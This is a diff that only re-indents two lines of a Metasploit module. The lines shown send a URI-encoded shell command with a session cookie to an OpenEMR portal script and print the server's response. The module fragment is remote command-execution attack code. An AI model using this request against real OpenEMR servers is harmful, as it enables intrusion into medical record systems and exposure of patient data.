@@ -69,8 +69,8 @@ class MetasploitModule < Msf::Auxiliary
            print_status "Executing command '#{cmd}'..."
            res = send_request_raw(
              {
-                              'uri' => "/#{dir}/portal/openemrdata.php?openemr=#{Rex::Text.uri_encode(cmd)}", 
-                              'cookie' => openemrid,
+                    'uri' => "/#{dir}/portal/openemrdata.php?openemr=#{Rex::Text.uri_encode(cmd)}", 
+                    'cookie' => openemrid,
              },5)
            
            puts res.body
